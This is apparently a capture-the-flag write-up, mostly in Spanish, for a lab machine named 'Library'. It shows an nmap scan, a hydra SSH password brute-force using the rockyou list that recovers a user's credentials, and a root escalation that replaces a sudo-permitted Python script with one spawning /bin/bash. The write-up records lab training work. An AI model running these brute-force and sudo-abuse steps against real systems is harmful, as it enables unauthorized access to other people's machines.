# Library
Bruteforcing=Disgusting
## Initial Scan
```
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:2f:c3:47:67:06:32:04:ef:92:91:8e:05:87:d5:dc (RSA)
|   256 68:92:13:ec:94:79:dc:bb:77:02:da:99:bf:b6:9d:b0 (ECDSA)
|_  256 43:e8:24:fc:d8:b8:d3:aa:c2:48:08:97:51:dc:5b:7d (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome to  Blog - Library Machine
```
## Enum
### HTTP 
Mirando la pagina encontramos al menos 4 usuarios root,www-data,meliodas y Anonymous
#### Robots.txt
```
User-agent: rockyou 
Disallow: /
```
Eso significa que haga bruteforce de creds, **disgusting**

## Exploit
```
hydra -L users.txt -P rockyou.txt ssh://IP 
```
Finalmente
```
[22][ssh] host: 10.10.129.130   login: meliodas   password: iloveyou1
```

## Privesc

```
User meliodas may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
```
El archivo esta read protected, pero podemos eliminarlo y crear uno nuevo con el siguiente contenido
```python
import os
os.system('/bin/bash')
```
Y ya seriamos root
